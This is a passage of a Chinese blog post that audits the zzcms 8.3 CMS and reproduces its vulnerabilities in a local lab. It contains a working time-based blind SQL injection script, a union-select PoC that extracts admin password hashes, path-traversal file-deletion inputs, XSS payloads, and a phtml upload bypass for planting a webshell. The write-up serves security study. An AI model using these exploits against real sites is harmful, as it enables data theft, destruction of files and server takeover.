class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>    flag = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">95</span>,<span class="hljs-number">123</span>):<br>        headers = &#123;<br>            <span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;bdshare_firstime=1589879442882; admin=admin; pass=21232f297a57a5a743894a0e4a801fc3; XDEBUG_SESSION=PHPSTORM; PHPSESSID=ph9j1ng6jabfc9lgcf09jsn553; UserName=test; PassWord=098f6bcd4621d373cade4e832627b4f6&quot;</span>,<br>            <span class="hljs-string">&quot;X-Forwarded-For&quot;</span>:<span class="hljs-string">&quot;1.1.1.1&#x27; and if(ascii(substr(database(),%d,1))=%d,sleep(3),1)#&quot;</span>%(i,j)<br>            &#125;<br><br>        r = requests.get(url,headers=headers,)<br>        <span class="hljs-comment"># print(r.text)</span><br>        t = r.elapsed.total_seconds()<br>        <span class="hljs-keyword">if</span> t &gt;= <span class="hljs-number">3</span>:<br>            database = database + <span class="hljs-built_in">chr</span>(j)<br>            print(database)<br>            flag = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> flag == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> j == <span class="hljs-number">122</span>:<br>        print(<span class="hljs-string">&quot;you got the database:&quot;</span>,database)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="3-sql注入漏洞3"><a href="#3-sql注入漏洞3" class="headerlink" title="3.sql注入漏洞3"></a>3.sql注入漏洞3</h3><p>​    该漏洞的漏洞编号是<strong>CVE-2018-14961</strong>，这个是我在网上查zzcms8.3的历史漏洞看到的。算是漏洞复现吧。</p>
+<p>漏洞代码出现在/<code>dl/dl_sendmail.php</code>的第42~45行。</p>
+<p>代码显示我们可以从前台post一个参数进来。用<code>stripfxg()</code>方法处理之后，赋值给<code>session[&#39;sql&#39;]</code>。同时在从<code>$_SESSION</code>的全局变量中取值再付给<code>$sql</code>参数。</p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/12.png" srcset="/img/loading.gif"></p>
+<p>我们跟进<code>stripfxg()</code>进行查看，我们可以发现我们传进来的$sql参数值中的反斜杠被去除了，同时我们可以发现<code>$htmlspecialchars_decode,$nl2br</code>这两个参数值默认都是<code>false</code>，所以这个方法中的两个if条件语句都是没有执行的。可以这样说该代码帮我去除了限制。。。但是其实这里即使没有引号，因此也是可以直接注入的。</p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/14.png" srcset="/img/loading.gif"></p>
+<p>然后我们可以看到在代码第74行可以发现，代码直接进行拼接再赋值给<code>$sql2</code>变量，在75行直接执行。</p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/13.png" srcset="/img/loading.gif"></p>
+<h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>首先在<code>/user/msg_manage.php</code>页面设置</p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/15.png" srcset="/img/loading.gif"></p>
+<p><strong>python脚本poc:</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1/dl/dl_sendmail.php&quot;</span><br>cookies = &#123;<span class="hljs-string">&#x27;UserName&#x27;</span>:<span class="hljs-string">&#x27;reader&#x27;</span>,<span class="hljs-string">&#x27;PassWord&#x27;</span>:<span class="hljs-string">&#x27;1de9b0a30075ae8c303eb420c103c320&#x27;</span>&#125;<br>data = &#123; <span class="hljs-string">&#x27;sql&#x27;</span>:<span class="hljs-string">&#x27;select email from zzcms_dl where id=-1 union select pass from zzcms_admin #&#x27;</span>&#125;<br><br>q = requests.post(url,data,cookies=cookies)<br>print(q.status_code)<br><span class="hljs-built_in">print</span> (q.text)<br></code></pre></td></tr></table></figure>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/17.png" srcset="/img/loading.gif"></p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/16.png" srcset="/img/loading.gif"></p>
+<h3 id="4-任意文件删除漏洞1"><a href="#4-任意文件删除漏洞1" class="headerlink" title="4.任意文件删除漏洞1"></a>4.任意文件删除漏洞1</h3><p>漏洞代码在<code>/user/adv.php</code>的75~84行，我们可以看到在$f该变量直接由<code>&quot;../&quot;</code>与<code>$oldimg</code>拼接而得，$oldimg是通过<code>$oldimg=$_REQUEST[&quot;oldimg&quot;];</code>得到的，该参数得到赋值后，接下来的代码并没有对该参数进行任何检验。我们可以利用<code>.</code>和<code>/</code>进行跨越目录的任意文件删除。</p>
+<p>利用条件：$action=’modify’ 并且$oldimg不等于$img参数</p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/18.png" srcset="/img/loading.gif"></p>
+<h4 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>首先我在/var/www目录下生成一个testFlag.txt文件（网站根目录是在/var/www/html），我尝试删除该文件。</p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/19.png" srcset="/img/loading.gif"></p>
+<p>poc:</p>
+<p><code>oldimg=../testFlag.txt&amp;action=modify</code></p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/20.png" srcset="/img/loading.gif"></p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/21.png" srcset="/img/loading.gif"></p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/22.png" srcset="/img/loading.gif"></p>
+<p>该漏洞在<code>/user/licence_save.php</code>下的31～35行也存在</p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/23.png" srcset="/img/loading.gif"></p>
+<p>在”**/user/manage.php<strong>“、”</strong>/user/ppsave.php<strong>“、”</strong>/user/zssave.php**“等文件中也存在类似漏洞，漏洞代码大同小异，我就不贴图了。</p>
+<h3 id="5-CVE-2018-13056-又是一个任意文件删除漏洞"><a href="#5-CVE-2018-13056-又是一个任意文件删除漏洞" class="headerlink" title="5.CVE-2018-13056(又是一个任意文件删除漏洞)"></a>5.CVE-2018-13056(又是一个任意文件删除漏洞)</h3><p>这个任意文件删除漏洞并不是我们上面分析的那种。</p>
+<p>漏洞点在<code>/user/del.php</code>的55~64行，这次$f变量<code>../</code>拼接的值是从数据库中得到的。从数据库中得到的值，代码中并没有对这个从数据库得到的值进行文件名合法检查就直接拼接了。</p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/24.png" srcset="/img/loading.gif"></p>
+<p>我们跟踪一下这个<code>$row[&#39;img&#39;]</code>的获得过程。我们要执行漏洞处代码，我们需要<code>$tablename=zzcms_main</code></p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/25.png" srcset="/img/loading.gif"></p>
+<p>因为我们要调用的漏洞代码需要我们表是<code>zzcms_main</code>，因此我们来看一下img数值是怎么插入到数据库中的<code>zzcms_main</code>。</p>
+<p>通过一顿乱找，终于在<code>/user/zssave.php</code>页面的第95行找到插入<code>zzcms_main</code>表的代码段了。所以向数据库中插入污点数据是很简单的，只要在发布招商信息的时候，抓包，修改掉img的数据即可。</p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/28.png" srcset="/img/loading.gif"></p>
+<h4 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>目标：删除在/var/www/目录下的flag.txt。</p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/30.png" srcset="/img/loading.gif"></p>
+<p>我们先发布招商信息，并且抓发往<code>/user/zssave.php</code>的请求包，修改img参数值。</p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/29.png" srcset="/img/loading.gif"></p>
+<p>然后再删除该招商信息，下图是进行删除操作时，相关变量的跟踪情况。</p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/31.png" srcset="/img/loading.gif"></p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/32.png" srcset="/img/loading.gif"></p>
+<p>结果并没删除。。。。这是为啥了，其实我们仔细看一下上面debug时的图，我们可以发现在$f的参数值是<code>.././flag.txt</code>这样是无法删除在<code>/var/www</code>目录下的文件的。造成这样的原因：substr()方法，该方法是字符串截断函数，我们可以发现他是从1开始进行截断的，这样就会少一个<code>.</code> </p>
+<figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smalltalk"><span class="hljs-string">$f</span>=<span class="hljs-comment">&quot;../&quot;</span>.substr(<span class="hljs-string">$r</span>ow[<span class="hljs-string">&#x27;img&#x27;</span>],<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure>
+<p>因此我们需要传入<code>.../flag.txt</code></p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/33.png" srcset="/img/loading.gif"></p>
+<p>老办法，删除并且追踪</p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/34.png" srcset="/img/loading.gif"></p>
+<p>成功删除。</p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/35.png" srcset="/img/loading.gif"></p>
+<h3 id="6-反弹型xss漏洞"><a href="#6-反弹型xss漏洞" class="headerlink" title="6.反弹型xss漏洞"></a>6.反弹型xss漏洞</h3><p>漏洞点在<code>uploadimg_form.php</code>的第66行和67行，直接将我们从前端用GET方法传入的值直接echo到前端中</p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/36.png" srcset="/img/loading.gif"></p>
+<p>payload:</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">?noshuiyin=&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml">?noshuiyin=1&amp;imgid=&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(2)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/37.png" srcset="/img/loading.gif"></p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/38.png" srcset="/img/loading.gif"></p>
+<p>在该cms中还有许多直接echo的，只需要简单的闭合就可以进行xss攻击。这里就不一一说明了。</p>
+<h3 id="7-CVE-2018-14962（存储型的xss）"><a href="#7-CVE-2018-14962（存储型的xss）" class="headerlink" title="7.CVE-2018-14962（存储型的xss）"></a>7.CVE-2018-14962（存储型的xss）</h3><p>该漏洞存在<code>/zt/show.php</code>211行</p>
+<p>因为调用了<code>stripfxg</code>函数，传入了一个$content变量和<code>true</code>。</p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/39.png" srcset="/img/loading.gif"></p>
+<p>跟进<code>stripfxg()</code>方法，我们可以发现消除了自己的过滤，输出的时候，导致了xss漏洞。</p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/40.png" srcset="/img/loading.gif"></p>
+<h4 id="漏洞利用-5"><a href="#漏洞利用-5" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>在<code>/user/manage.php</code>页面下设置公司的简介，修改如下</p>
+<p>payload:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-number">123</span><span class="hljs-string">&quot;&gt;&lt;img src=&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot; onerror=&quot;</span>alert(<span class="hljs-built_in">document</span>.cookie)<span class="hljs-string">&quot;&gt;</span><br></code></pre></td></tr></table></figure>
+<p>然后访问<code>/zt/show.php?id=1</code></p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/41.png" srcset="/img/loading.gif"></p>
+<h3 id="8-文件上传漏洞"><a href="#8-文件上传漏洞" class="headerlink" title="8.文件上传漏洞"></a>8.文件上传漏洞</h3><p><code>/uploadimg_form.php</code>文件提供了一个文件上传的功能，然而这里<code>/uploadimg.php</code>的后端处理代码没有过滤好，导致可以上传webshell。我们来看一下代码：</p>
+<p>他检查了文件大小、文件类型（GIF89A绕过）、文件后缀（利用黑名单机制，但是黑名单不够全面）</p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/42.png" srcset="/img/loading.gif"></p>
+<p>黑名单少过滤了phtml，而apache会将phtml文件按照php文件来解析。</p>
+<h4 id="漏洞利用-6"><a href="#漏洞利用-6" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/43.png" srcset="/img/loading.gif"></p>
+<p>然后用蚁剑连接就行了</p>
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>这次代码审计，虽然审计的是一个小的cms，但是也是我审计一个最为完全的一次。再接再厉吧。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/web/">web</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/05/30/GKCTF%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">GKCTF题目复现</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/">
+                        <span class="hidden-mobile">[代码审计]代码审计小挑战</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('vcomments', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "r1aoO2CU8pztHBXDkQYFikuI-gzGzoHsz",
+          app_key: "dJhm8HsnHbHaA1BVeojBc6MI",
+          placeholder: "Just go go",
+          path: window.location.pathname,
+          avatar: "mm",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
